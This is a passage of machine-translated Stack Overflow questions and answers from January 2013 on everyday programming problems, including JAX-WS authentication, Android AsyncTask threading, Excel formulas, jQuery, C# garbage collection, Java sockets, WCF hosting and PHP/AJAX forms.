Netbeans 生成服务/模式类（通过身份验证），我在 Glassfish 3.1.2 上运行我的客户端。我添加了一个 Servlet 来访问该服务。但我在尝试访问服务时收到 HTTP 响应代码：401 (=Unauthorized) 和`WSDL`. 该服务确实连接到`HTTPS`，但错误告诉`HTTP`。

添加用户名/密码以访问 Web 服务的正确方法是什么？

Servlet 的服务提供者

```
private static LogicalModel pullpullEnterpriseService() {
    pullEnterpriseService service = new pullEnterpriseService();        
    ClientPullSoapBinding port = service.getClientPullSoapBinding();        

    BindingProvider prov = ((BindingProvider)port);
    prov.getRequestContext().put(BindingProvider.USERNAME_PROPERTY, "myuser");
    prov.getRequestContext().put(BindingProvider.PASSWORD_PROPERTY, "mypassword");

    return port.getDataModel();
} 
```

我尝试在 SOAP 标头中提供用户/密码，但结果相同

```
 ...
    Map<String, Object> req_ctx = ((BindingProvider)port).getRequestContext();        

    Map<String, List<String>> headers = new HashMap<String, List<String>>();
    headers.put("Username", Collections.singletonList("myuser"));
    headers.put("Password", Collections.singletonList("mypassword"));
    req_ctx.put(MessageContext.HTTP_REQUEST_HEADERS, headers);
    ... 
```

我看过这些帖子，但它们并没有解决我的问题：

[如何使用 Java JAX-WS 添加 SOAP 标头](https://stackoverflow.com/questions/830691/how-do-i-add-a-soap-header-using-java-jax-ws?rq=1)

[http://www.mkyong.com/webservices/jax-ws/application-authentication-with-jax-ws/](http://www.mkyong.com/webservices/jax-ws/application-authentication-with-jax-ws/)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-08T18:20:42.737

您可以尝试在项目中本地存储 WSDL。

[请参阅使用 Java 6 和 JAX-WS-Wiki-Confluence 使用 Web 服务](https://web.archive.org/web/20111228034036/shrubbery.mynetgear.net/c/display/W/Consuming+a+Web+Service+with+Java+6+and+JAX-WS)中的示例。

然后您可以使用*指定端点地址和 HTTP 基本授权*部分中的方式，就像您问题中的第一个代码一样。

我希望这对你有帮助。

# android - 在 Plugin.execute() 中实例化 AsyncTask 时出现 ExceptionInInitializerError

> ID：14220794
> 
> 赞同：2
> 
> 时间：2013-01-08T17:32:55.827
> 
> 标签：android, plugins, android-asynctask, cordova-2.0.0

我正在开发一个应用程序，在其中我使用`cordova`Api 在*`Sencha`*代码和`*Android native Code*`.

在我的插件`execute`方法中，我正在启动一个`AsyncTask`（用于设备注册），但我进入`ExceptionInInitializerError`了***第 36 行***（实例化`TaskDeviceRegistration`）。

**注册设备插件**：

```
public class DeviceRegistrationPlugin extends Plugin {

    public static final String TAG = "DeviceRegistrationPlugin";
    public static final String ACTION_REGISTER_DEVICE = "registerDeviceAction";

    protected String callBackMethod;

    @Override
    public PluginResult execute(String action, JSONArray args, String callBackId) {

        String token;
        if(action.equals(ACTION_REGISTER_DEVICE)) {
            try {
                token = args.getString(0);
                if(token != null) {
                    // launch the task to register device
                    SharedPreferences prefs = cordova.getActivity().getSharedPreferences(WebServiceRequest.PREFS_IDENTIFICATION, Context.MODE_PRIVATE);
                    prefs.edit().putString(WebServiceRequest.PREF_TOKEN_PARAM, token).commit();
                    TaskRegisterDevice task = new TaskRegisterDevice(cordova.getActivity());// this is the line 36
                    task.execute();

                    // tell the plugin that the callBack will be executed after the task
                    // has finished his work.
                    this.callBackMethod = callBackId;
                    PluginResult pluginResult = new PluginResult(PluginResult.Status.NO_RESULT);
                    pluginResult.setKeepCallback(true);
                    return pluginResult;
                }
                else {
                    return new PluginResult(Status.ERROR, "token required");
                }

            } catch (JSONException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
                return new PluginResult(PluginResult.Status.JSON_EXCEPTION);
            }
        }
        else {
            // invalid action sended to the plugin
            return new PluginResult(PluginResult.Status.INVALID_ACTION);
        }
    }

    /**
     * asynctask to register the device
     * @author houcine
     * 
     */
    class TaskRegisterDevice extends AsyncTask<Void, Void, Boolean> {

        protected Context context;

        public TaskRegisterDevice(Context context) {
            this.context = context;
        }

        @Override
        protected Boolean doInBackground(Void... params) {
            try {
                return WebServiceRequest.RegisterDevice(context);
            } catch (JSONException e) {
                e.printStackTrace();
                return true;
            } catch (IOException e) {
                e.printStackTrace();
                return true;
            }
        }

        @Override
        protected void onPostExecute(Boolean result) {
            // return new plugin result when synchronization done
            Log.d(TAG, "resultat DeviceRegistration : "+result + " , \ncallBackMethod : "+callBackMethod);
            PluginResult pluginResult = new PluginResult(
                    PluginResult.Status.OK, result);
            pluginResult.setKeepCallback(false);
            success(pluginResult, callBackMethod);
        }

    }

} 
```

**清单文件：**

```
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.myapp.activity"
    android:versionCode="1"
    android:versionName="1.0.2" >

     <supports-screens
     android:largeScreens="true"
     android:normalScreens="true"
     android:smallScreens="true"
     android:resizeable="true"
     android:anyDensity="true"
     />

     <uses-sdk android:minSdkVersion="5" android:targetSdkVersion="16"/>
     //other stuff : declaration of <application> tag , activities , services...etc
> 
```

**和 logCat ：**

```
01-01 06:54:26.251: E/AndroidRuntime(6189): FATAL EXCEPTION: Thread-31
01-01 06:54:26.251: E/AndroidRuntime(6189): java.lang.ExceptionInInitializerError
01-01 06:54:26.251: E/AndroidRuntime(6189):     at com.myapp.plugins.DeviceRegistrationPlugin.execute(DeviceRegistrationPlugin.java:36)
01-01 06:54:26.251: E/AndroidRuntime(6189):     at org.apache.cordova.api.PluginManager$1.run(PluginManager.java:192)
01-01 06:54:26.251: E/AndroidRuntime(6189):     at java.lang.Thread.run(Thread.java:1096)
01-01 06:54:26.251: E/AndroidRuntime(6189): Caused by: java.lang.RuntimeException: Can't create handler inside thread that has not called Looper.prepare()
01-01 06:54:26.251: E/AndroidRuntime(6189):     at android.os.Handler.<init>(Handler.java:121)
01-01 06:54:26.251: E/AndroidRuntime(6189):     at android.os.AsyncTask$InternalHandler.<init>(AsyncTask.java:421)
01-01 06:54:26.251: E/AndroidRuntime(6189):     at android.os.AsyncTask$InternalHandler.<init>(AsyncTask.java:421)
01-01 06:54:26.251: E/AndroidRuntime(6189):     at android.os.AsyncTask.<clinit>(AsyncTask.java:152)
01-01 06:54:26.251: E/AndroidRuntime(6189):     ... 3 more 
```

**注意：该应用程序在 HTC ONE S、HTC ONE X、SAMSUNG GALAXY S II、SAMSUNG GALAXY SIII 上运行良好，android sdk 版本：4.0 或更高，但不适用于 android 版本如 2.2.2 的设备, 2.3.5 , 2.3.3**

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-01-08T17:40:08.170

`AsyncTask`应该在 UI 线程上创建和执行。看起来`DeviceRegistrationPlugin.execute()`方法是在主线程之外调用的，这就是您收到错误的原因。

您可以尝试以这种方式修复它：

```
cordova.getActivity().runOnUiThread(new Runnable() {
    @Override
    public void run() {
        TaskRegisterDevice task = new TaskRegisterDevice(cordova.getActivity());
        task.execute();
    }
}); 
```

# excel-formula - 在指定行中搜索特定文本

> ID：14220796
> 
> 赞同：0
> 
> 时间：2013-01-08T17:32:59.323
> 
> 标签：excel-formula, excel-2010

如果在 WorkBook2 的 ColB 中找到来自 WorkBook1 的 Text“A”，则从 WorkBook2**的 ROW**中搜索其中找到 Text“A”的列的范围以找到 Text“B”。

本质上，我有两个电子表格，通过一个共同的标识符（完成工作的人）链接。在 WorkBook2 中，人们可以为无数不同的任务获得认证，他们的认证代码存储在 AN:HP 列中。WorkBook1 包含已完成的工作、完成工作的人员以及工作类型。我想搜索 WorkBook2 以查看完成该工作的人是否获得了该类型工作的认证。困难在于每个人最多可以持有 20 个不同的认证代码。

我目前可以在 WorkBook2 中找到从 WorkBook1 的 H 列列出的人（文本“A”）的行`=MATCH(H2,'[WorkBook2]Sheet1'!$B:$B,0)`现在我需要使用该行号作为数组在 WorkBook2 中搜索认证类型（文本“B”）在[工作簿1]Sheet1'!T2

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-09T01:41:05.280

您已设法获得正确的第一部分，即使用 a`MATCH()`返回列出此人的行。您可以使用该`OFFSET()`函数根据该行号创建动态范围。

`OFFSET()`取一个范围，然后将其偏移一些行或列。

`OFFSET(reference, rows, cols, [height], [width])`

因此，您可以创建对所需行的引用

`OFFSET([Workbook2]Sheet1!$AN$1:$HP$1,MATCH(H2,'[WorkBook2]Sheet1'!$B:$B,0)-1,0)`

这通过将起始范围设置为 AN1:HP1 然后将其向下移动从`MATCH` *less 1*返回的行号来工作。如果我们不减一，我们会超调一排。

然后，您可以使用匹配项来查找认证。

`=MATCH(T2,OFFSET([Workbook2]Sheet1!$AN$1:$HP$1,MATCH(H2,'[WorkBook2]Sheet1'!$B:$B,0)-1,0),0)`

# ios - 在 iOS 的 UITableView 中从单元格内的按钮调用方法时遇到问题

> ID：14220799
> 
> 赞同：0
> 
> 时间：2013-01-08T17:33:15.507
> 
> 标签：ios, uitableview, uibutton

我有一个具有 tableView 的 UITableViewController。每个单元格都有一个按钮，可以像复选框一样选择/取消选择，并且执行此操作的方法运行良好。我想有另一种方法，由 tableheaderview 中的按钮调用，该方法能够遍历此列表并一举选择所有按钮。具有讽刺意味的是，我能够执行迭代，但似乎无法调用选择/取消选择按钮的方法。

这是我的相关代码：

```
//This is my method does the iteration
- (void) startWizard {

    NSLog(@"Did it select?");

    for (int i = 0; i < [self.tableView numberOfSections]; i++) {
        for (int j = 0; j < [self.tableView numberOfRowsInSection:i]; j++) {
            NSUInteger ints[2] = {i,j};
            NSIndexPath *indexPath = [NSIndexPath indexPathWithIndexes:ints length:2];
            UITableViewCell *cell = [self.tableView cellForRowAtIndexPath:indexPath];
            //Here is my code to call the method that selects/deselects
            [self buttonTouched:nil];

        }
    }
} 
```

这是对每个按钮进行实际选择/取消选择的方法（并且工作正常）：

```
-(void)buttonTouched:(id)sender
{
    UIButton *btn = (UIButton *)sender;

    if( [[btn imageForState:UIControlStateNormal] isEqual:[UIImage imageNamed:@"CheckBox1.png"]])
    {
        [btn setImage:[UIImage imageNamed:@"CheckBox2.png"] forState:UIControlStateNormal];
        // other statements
    }
    else
    {
        [btn setImage:[UIImage imageNamed:@"CheckBox1.png"] forState:UIControlStateNormal];
        // other statements
    }

} 
```

每个单元格中的按钮已作为其 accesseryView 添加到该单元格，如下所示：

```
[cell setAccessoryView:testButton]; 
```

谁能看到我做错了什么，以及如何解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-08T17:43:02.783

当您在循环中调用时，您使用as 的值`[self buttonTouched:nil];`调用该方法。因此， set to中的第一行和其余方法对 nil 按钮进行操作。找到一种方法将实际按钮对象传递给或传递 indexPath 并通过它找到正确的按钮。`buttonTouched``nil``sender``buttonTouched``btn``nil``buttonTouched`

# css - iframe，全屏 css - 为什么滚动条

> ID：14220800
> 
> 赞同：4
> 
> 时间：2013-01-08T17:33:15.733
> 
> 标签：css, iframe

我想在 iframe 全屏上制作。这是代码：

[http://jsbin.com/ibopes/1/edit](http://jsbin.com/ibopes/1/edit)

这是演示：

[http://jsbin.com/ibopes](http://jsbin.com/ibopes)

为什么是滚动条？出于某种原因，我不能`position: absolute`用于 iframe，而且我不想`overflow: hidden`在身体上使用。

如何隐藏滚动条，为什么会出现？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-01-08T17:37:26.627

`display: block`在您的 iFrame 上指定。jsBin 为您规范化 CSS：

```
#test {  
    width: 100%;
    height: 100%;
    min-height: 100%;
    border: none;
    background: #ff0000;
    display: block;
} 
```

在此处查看工作演示 > [http://jsbin.com/ipopes/5](http://jsbin.com/ibopes/5)

# apache-flex - 在 Flex 错误中打开 URL

> ID：14220807
> 
> 赞同：0
> 
> 时间：2013-01-08T17:33:50.680
> 
> 标签：apache-flex, browser, flash-builder

我正在尝试使按钮操作打开特定的浏览器窗口`URL`，我想我几乎已经做到了，但是发生了一个奇怪的问题。下面的代码会打开一个新的浏览器窗口，但会在父窗口`URL`的末尾添加 。`URL`见下文：

```
protected function launchPrinter_clickHandler(event:MouseEvent):void
        {
            var url:String = dataGrid2.selectedItem.ip_address;
            var urlRequest:URLRequest = new URLRequest(url);
            navigateToURL(urlRequest);
        } 
```

这是父 URL： `http://???.???.???.???/IT%20Tools-debug/Main.html`

这是新创建的浏览器窗口中的 URL： `http://???.???.???.???/IT%20Tools-debug/15.155.205.134`

如何打开一个只有`url`变量作为地址的新浏览器窗口？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-08T17:42:11.707

尝试这个：

```
var url:String = "http://"+dataGrid2.selectedItem.ip_address; 
```

# ios - 即使应用程序在非视网膜模式下运行，触摸也处于视网膜分辨率

> ID：14220809
> 
> 赞同：0
> 
> 时间：2013-01-08T17:33:54.947
> 
> 标签：ios, ipad, retina-display

我有一个针对 iPad2（非视网膜 1024x768 显示器）的应用程序。我没有明确启用视网膜模式，我的比例因子设置为 1，但触摸事件在视网膜模式下报告坐标，即屏幕*中心*是 (1024,768)，角落是 (2047,1535)。

我认为重点是 iPad 应用程序会自动在非视网膜模式下工作，除非您通过更改比例因子明确启用它。

我正在使用一个创建一些 UIView 的库，如何获取主 UIView 并查询它以查看发生了什么？

对于视网膜测试，我只依赖模拟器 - 我有 6.1。然而，另一位开发人员确认它没有响应他的 iPad3 设备上的触摸，所以我确定这不是模拟器问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-09-12T04:33:16.993

有一些技术错误，可能你没有仔细阅读苹果文档。

1）您无法启用/禁用视网膜：视网膜在硬件中，iOS可以正确使用它，您只能使用它。（在某些情况下，您可以使代码适应设备）

2）比例因子很少应该使用（阅读苹果文档）并且只在与自定义绘图相关的专门代码中使用

3) 通常在 Apple 视觉中您不应该在视网膜硬件和非视网膜中表现不同。4) 像素和坐标是逻辑坐标，所以右下角像素总是在 y=1024 x=768。

4) iPad2 上不能有 2048 像素分辨率。

我不知道您使用的是哪个库，但 STD 行为不同。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-08T17:54:11.603

我的 glkview 应用程序有相反的情况。我使用 screen->scale 属性来翻译点击坐标。所以你所拥有的是（我怀疑）是以下之一：（a）在你的故事板中有一些属性设置为你的视图（检查它们全部）（b）你的设备提供这样的布局（什么 iPad btw）？

稍后将发布更多详细信息。

# javascript - 如何从给定的订单号开始删除表格行或列表项？

> ID：14220811
> 
> 赞同：-1
> 
> 时间：2013-01-08T17:33:59.157
> 
> 标签：javascript, jquery, html

给定`<table>`具有多行 ( `<tr>`) 的 a，甚至是`<ul>`具有多个列表项 ( `<li>`) 的 a，如何使用 jQuery 删除具有给定顺序的元素下方的所有元素（分别为行或列表项）？

例如，如果表中有 10 行，我将如何删除第 3 行之后的所有行？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-08T17:36:39.940

```
jQuery('tr').slice(2).remove(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-08T17:35:29.990

```
$('li:gt(2)').remove(); // will keep the first 3 LI 
```

或者也：

```
$('li').eq(2).nextAll('li').remove(); 
```

或者：

```
$('li').eq(3).nextAll('li').andSelf().remove(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-08T17:40:50.900

```
$("ul li:gt(2)").remove(); 
```

或者

```
$("tr:gt(2)").remove(); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-08T17:39:32.177

接下来就可以全部使用了。

```
$(function(){
  $('li').click(function(){
    $(this).nextAll().remove();
  });
}); 
```

[小提琴](http://jsfiddle.net/y3Z2E/)

# c# - 结构是否可用于垃圾收集？

> ID：14220812
> 
> 赞同：1
> 
> 时间：2013-01-08T17:34:02.160
> 
> 标签：c#, c#-4.0, garbage-collection, c#-3.0

```
struct a
{
   public string str;
}

a bb = new a(); 
```

* * *

```
class a
{
   public string str;
}

a bb = new a(); 
```

说类总是被垃圾收集是否正确？结构是否保存在内存中（永远）？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-08T17:37:09.343

是的。如果`struct`是引用类型的对象的字段，则存储在堆中，然后进行垃圾回收

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-01-08T17:38:13.657

**编辑**-> 回答更新后的评论讨论，以及 Rob 共享的链接

`struct`是[值类型](http://msdn.microsoft.com/en-us/library/s1ax56ch.aspx)。通常不会在堆上为它们分配单独的内存。通常不需要垃圾收集。

然而也有例外。内存分配不保证为值类型分配堆栈或为引用类型分配堆。阅读[其他 SO 问题的](https://stackoverflow.com/questions/4853213/c-sharp-struct-stack-allocated-or-sometimes-heap-allocated)[答案](https://stackoverflow.com/a/4853251/649524)和实现[细节中的堆栈以](http://blogs.msdn.com/b/ericlippert/archive/2009/04/27/the-stack-is-an-implementation-detail.aspx)获取详细信息。

如果有一些引用类型作为成员变量，那么一旦超出范围，`struct`引用类型将被垃圾收集（在下一个垃圾收集触发器中）并且引用类型没有更多可访问的根。`struct`

如果您的示例，您已用作`string`参考[类型](http://msdn.microsoft.com/en-us/library/490f96s2.aspx)。`String`使用[实习池](http://en.wikipedia.org/wiki/String_interning)以不同方式处理。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-01-08T17:47:28.730

如果您的问题是字符串是否会在 struct 示例中保留在内存中，那么答案是否定的。结构的成员在离开作用域时会受到垃圾回收，就像任何其他对象一样。

.NET GC 使用标记和清除方法，它检查静态字段指向的对象、现有对象和堆栈上的局部变量等。

由于局部变量中的结构位于堆栈上，因此它们被正常扫描。当 GC 遍历对象树时，堆上对象成员中的结构也会被扫描。静态成员也是如此。

简而言之，结构的扫描方式与类相同。它们之间的唯一区别是它们的存储方式。结构是按变量存储的，而类是作为引用存储的。两种方式均受 GC 约束。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-08T17:49:13.427

如果我没记错的话，是的，在 C# 中它们都是垃圾收集器。

是否存储在堆或堆栈中取决于变量/实例的生命周期而不是类型。

需要考虑的一件事是，当订阅事件处理程序等更复杂的情况驻留在类的实例中时，在这种情况下，垃圾收集器可以跳过收集，而实例可以驻留在内存中。但是由于只声明了一种字符串类型，因此可能会收集上面的示例。

# java - Java Sockets - 读取服务器获取的数据的客户端

> ID：14220813
> 
> 赞同：0
> 
> 时间：2013-01-08T17:34:02.773
> 
> 标签：java, sockets, client

我正在开发一个 java 套接字程序，并且与客户端部分存在争议。服务器获取所有客户端写入的内容，但客户端仅获取其写入的内容。有人可以为我提供一个程序的客户端部分的示例，该程序可以获取所有客户端编写的内容吗？谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T17:53:36.613

这是一个“回声服务器”示例

```
import java.io.*;
import java.net.*;

class TCPServer
{
public static void main(String argv[]) throws IOException
{
    ServerSocket serverSocket = null;
    DataInputStream serverInput = null;
    PrintStream serverOutput = null;
    String line = null;
    Socket clientSocket = null;

    // create server socket
    try
    {
        serverSocket = new ServerSocket(2012);
        clientSocket = serverSocket.accept();
        serverInput = new DataInputStream(clientSocket.getInputStream());
        serverOutput = new PrintStream(clientSocket.getOutputStream());
    }
    catch(IOException e){System.out.println(e);}

    // receive data and send it back to the client
    try
    {
        while(true)
        {
            line = serverInput.readLine();
            if(line.equals("exit"))
            {
                break;
            }
            else
            {
                if(!line.equals(null) && !line.equals("exit"))
                {
                    System.out.println("Received " +line);
                    line = line+" MODIFIED";
                    serverOutput.println(line);
                }
            }
        }
    }
    catch(IOException e){System.out.println("SERVER SIDE: Unable send/receive data");}

    try
    {
        serverInput.close();
        serverOutput.close();
        clientSocket.close();
        serverSocket.close();
    }
    catch(IOException e){System.out.println(e);}
}
} 
```

这里是客户端

```
import java.io.*;
import java.net.*;

public class TCPClient
{
public static void main(String[] args) throws IOException 
{

    Socket echoSocket = null;
    PrintWriter out = null;
    BufferedReader in = null;

    try {
        echoSocket = new Socket("localhost", 2012);
        out = new PrintWriter(echoSocket.getOutputStream(), true);
        in = new BufferedReader(new InputStreamReader(echoSocket.getInputStream()));
    } catch (UnknownHostException e) {
        System.err.println("Don't know about host");
        System.exit(1);
    } catch (IOException e) {
        System.err.println("Couldn't get I/O");
        System.exit(1);
    }

BufferedReader stdIn = new BufferedReader(new InputStreamReader(System.in));
String userInput;

while ((userInput = stdIn.readLine()) != null) {
    out.println(userInput);
    System.out.println("echo: " + in.readLine());
    if(userInput.equals("exit"))
    break;
}

out.close();
in.close();
stdIn.close();
echoSocket.close();
}
} 
```

# .net - IIS 中的多个 wcf 服务

> ID：14220814
> 
> 赞同：1
> 
> 时间：2013-01-08T17:34:05.207
> 
> 标签：.net, wcf

我正在尝试在同一基本 URL 上的 IIS 下运行多个 WCF 服务（因此我的项目有多个 .svc 文件）。当我只有一项服务时，一切正常，但当我添加其他服务时，问题就来了。当我尝试访问任何这些附加服务时，客户似乎认为该合同是“IMerchantService”合同。例如，如果我浏览到[http://merchants.localtest.me/MerchantProductService.svc?wsdl](http://merchants.localtest.me/MerchantProductService.svc?wsdl)（本地托管服务的地址），则返回的服务定义是 IMerchantService 而不是 IMerchantProductService。此外，当我浏览到[http://merchants.localtest.me/MerchantProductService.svc](http://merchants.localtest.me/MerchantProductService.svc)时，标题是“MerchantService”，而不是我所期望的“MerchantProductService”。

我的服务配置如下：

```
 <services>
  <service name="MyCompany.Services.Merchants.MerchantProductService">
    <endpoint address="" behaviorConfiguration="Proto.Common.EndpointBehavior" binding="netTcpBinding" bindingConfiguration="NetTcpBinding_Common" contract="MyCompany.Api.Merchants.Services.IMerchantProductService"/>
    <endpoint address="mexMerchantProductService"
          binding="mexHttpBinding"
          contract="IMetadataExchange" />
  </service>
  <service name="MyCompany.Services.Merchants.MerchantService">
    <endpoint address="" behaviorConfiguration="Proto.Common.EndpointBehavior" binding="netTcpBinding" bindingConfiguration="NetTcpBinding_Common" contract="MyCompany.Api.Merchants.Services.IMerchantService"/>
    <endpoint address="mexMerchantService"
          binding="mexHttpBinding"
          contract="IMetadataExchange"  />
  </service>
  <service name="MyCompany.Services.Merchants.Workflows.NewMerchantWorkflow">
    <endpoint address="" behaviorConfiguration="Proto.Common.EndpointBehavior" binding="netTcpBinding" bindingConfiguration="NetTcpBinding_Common" contract="MyCompany.Api.Merchants.Services.INewMerchantServiceWorkflow"/>
    <endpoint address="mexNewMerchantWorkflow"
  binding="mexHttpBinding"
  contract="IMetadataExchange" />
  </service>
  <service name="MyCompany.Services.Merchants.MerchantFreightService">
    <endpoint address="" behaviorConfiguration="Proto.Common.EndpointBehavior" binding="netTcpBinding" bindingConfiguration="NetTcpBinding_Common" contract="MyCompany.Api.Merchants.Services.IMerchantFreightService"/>
    <endpoint address="mexMerchantFreightService"
  binding="mexHttpBinding"
  contract="IMetadataExchange" />
  </service>
  <service name="MyCompany.Services.Merchants.MerchantAuctionService">
    <endpoint address="" behaviorConfiguration="Proto.Common.EndpointBehavior" binding="netTcpBinding" bindingConfiguration="NetTcpBinding_Common" contract="MyCompany.Api.Pricing.Services.IMerchantAuctionService"/>
    <endpoint address="mexMerchantAuctionService"
  binding="mexHttpBinding"
  contract="IMetadataExchange" />
  </service>
</services> 
```

我已经尝试删除额外的 mex 端点，但这没有任何区别。另外，我检查了合同，对我来说看起来还不错。IMerchantProductService 合约如下：

```
[ServiceContract(Namespace = "http://www.MyCompany.com/services/", Name = "MerchantProductService")]
[ContractClass(typeof(MerchantProductServiceContracts))]
public interface IMerchantProductService
{
    /// <summary>
    /// Searchs the merchants product catalog using product name, merchant sku or product global id
    /// </summary>
    /// <param name="searchTerm"></param>
    /// <returns></returns>
    [OperationContract]
    List<MerchantProductQuickSearchItem> QuickSearchMerchantProducts(int merchantId, string searchTerm);

    /// <summary>
    /// Gets a merchant product based on the Id
    /// </summary>
    /// <param name="ourMerchantProductId">The id of the product to get</param>
    /// <returns></returns>
    [OperationContract]
    MerchantProduct GetMerchantProduct(int ourMerchantProductId, int merchantId);

    ///etc.

} 
```

IMerchantService 合约如下：

```
[ServiceContract(Namespace = "http://www.MyCompany.com/services/", Name = "MerchantService")]
[ContractClass(typeof(MerchantServiceContracts))]
public interface IMerchantService
{
    /// <summary>
    /// Gets a merchant instance
    /// </summary>
    /// <param name="merchantId"></param>
    /// <returns></returns>
    [OperationContract]
    Merchant GetMerchant(int merchantId);

    /// <summary>
    /// Gets a merchant's bid settings
    /// </summary>
    /// <param name="merchantId"></param>
    /// <returns></returns>
    [OperationContract]
    MerchantBidSettings GetMerchantBidSettings(int merchantId);

    //etc.
} 
```

到目前为止我尝试过的事情：

1.  将所有内容更改为 basicHttpBinding。没区别。
2.  删除了 Protobuf 行为配置。没区别。
3.  删除各个 mex 端点。没有区别
4.  尝试了不同的客户端（WCFStorm、WCF 测试客户端）并且都报告了错误的合同
5.  检查各个 svc 文件是否正在实施预期的合同（它们是）。

我想我的问题是 1）这是否可能（即多个 .svc 文件与 IIS 托管），如果是这样 2）我的配置是否有问题可能导致我的问题。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-08T18:09:28.907

检查每个 .svc 文件的内容。您是否引用了正确的服务实现？您需要 web.config + .svc 文件 + c# 合同定义 + c# 服务实现来获得它。

```
<%@ ServiceHost 
    Language="C#"
    Debug="true"
    Service="MyCompany.Services.Merchants.MerchantService" %> 
```

# php - 如何在php中访问ajax返回值

> ID：14220818
> 
> 赞同：-1
> 
> 时间：2013-01-08T17:34:12.907
> 
> 标签：php, ajax

嗨，我对 Web 开发真的很陌生。我想知道如何在 php 中访问 ajax 返回值。当我从下拉列表中选择一个选项时，我会使用 ajax 获得另一个下拉列表。但我想使用 php 使用页面上的值。

```
 Practice Name : 
    <select name="practiceName" id="practiceName" onchange="showAssociate(this.value)">
    <option value="">Select an option</option>
 <option value="abc">abc</option>
 <option value="xyz">xyz</option>

    </select>
<p>

<div id="associate">
</div> 
```

ajax代码是：

```
 function showAssociate(str)
{
if (str=="")
{
document.getElementById("associate").innerHTML="";
return;
} 
if (window.XMLHttpRequest)
{// code for IE7+, Firefox, Chrome, Opera, Safari
xmlhttp=new XMLHttpRequest();
 }
else
{// code for IE6, IE5
xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
}
xmlhttp.onreadystatechange=function()
{
if (xmlhttp.readyState==4 && xmlhttp.status==200)
{
document.getElementById("associate").innerHTML=xmlhttp.responseText;
}
}
xmlhttp.open("GET","getAssociate.php?q="+str,true);
xmlhttp.send();
} 
```

ajax 在 div 'associate' 中返回所需的下拉框和值，但是在提交表单时如何在 php 中使用这些值？我只需要在屏幕上的某个地方访问并回显它。请帮忙。提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-08T17:40:17.490

如果您希望通过 ajax 检索到的数据与表单一起发送，您可以填充隐藏输入，以便在表单提交中传输数据。

```
<input type="hidden" id="data" name="data" value="" /> 
```

在 Javascript 中，填充其值：

```
document.getElementById("associate").innerHTML=xmlhttp.responseText;
document.getElementById("data").value = xmlhttp.responseText; 
```

在 PHP 端，当您处理表单提交时，它将出现在`$_POST['data']`（假设表单的方法是`POST`）。

# c++ - 从 Windows 命令行运行 C++ 应用程序

> ID：14220822
> 
> 赞同：0
> 
> 时间：2013-01-08T17:34:24.447
> 
> 标签：c++, compilation, cygwin

我已经安装了 cygwin 以编译 C++ 源代码。在这个阶段，我可以通过图标直接调用 C++ 应用程序来运行它。但是，一旦我在 cmd 命令行上键入 g++，我就会收到“拒绝访问”消息。该命令在 cygwin 终端窗口上运行良好。如何处理这个问题？这个问题是由这个论坛上的另一个问题引发的。一旦我运行 C++ 应用程序（没有错误），我就无法在 Eclipse IDE 上看到输出。我认为我在 cmd 上收到“拒绝访问”消息的事情可能是上述麻烦的罪魁祸首。只是尝试所有的东西。最好的祝福

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T17:36:42.443

您是否将 cygwin 添加到 Windows 中的路径中？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-08T17:38:48.390

我对cygwin不熟悉，但是您可以尝试一个代码。它类似于 linux 上的“sudo”，它给你更多的权限......它被称为“runas”。看看这个网站：[http ://www.microsoft.com/resources/documentation/windows/xp/all/proddocs/en-us/runas.mspx?mfr=true](http://www.microsoft.com/resources/documentation/windows/xp/all/proddocs/en-us/runas.mspx?mfr=true)

# youtube - Windows 手机上的 youtube 元数据

> ID：14220824
> 
> 赞同：0
> 
> 时间：2013-01-08T17:34:29.087
> 
> 标签：youtube, youtube-api, windows-phone-8

我打算为windows phone 开发一个应用程序。

实际上，在这个应用程序中，我需要为每个用户提供一些来自 youtube 的元数据，尤其是他们喜欢的视频和他们在 youtube 上的播放列表。但是，当我开始搜索它时，我发现了这个消息，即 Windows Phone 不完全支持 youtube api。

```
http://www.infoworld.com/t/windows-phone/in-blocking-windows-phone-access-youtube-google-delivers-rough-justice-210116 
```

所以，我想知道这个功能是否可以在windows phone 应用程序中实现？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-08T23:44:10.293

GData APIs work just fine on WP7/WP8 AFAIK. IANAL but it works fine and I haven't seen any official disclaimer saying it won't/shouldn't work. I believe this article has more to do about streaming video APIs then GData APIs.

You can see a sample of those APIs and how to use them in [the official docs](https://developers.google.com/youtube/2.0/developers_guide_protocol#formatsp) and in this previous answer of mine @ [Possible to play Youtube video in a wp7 app?](https://stackoverflow.com/questions/4869564/possible-to-play-youtube-video-in-a-wp7-app/4879138#4879138)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-08T23:59:10.993

您可以使用 YouTube Data API v3 获取用户元数据。

[https://developers.google.com/youtube/v3/docs/playlists](https://developers.google.com/youtube/v3/docs/playlists)

从文档中：

> YouTube 还使用播放列表来识别频道的特殊视频集合，例如：
> 
> *   上传的视频
> *   最喜欢的视频
> *   积极评价（喜欢）的视频
> *   观看历史
> *   稍后观看

如果您使用任何 JSON 库和 OAUTH2 身份验证，则可以从任何客户端使用 API。

这个项目展示了如何做到这一点；

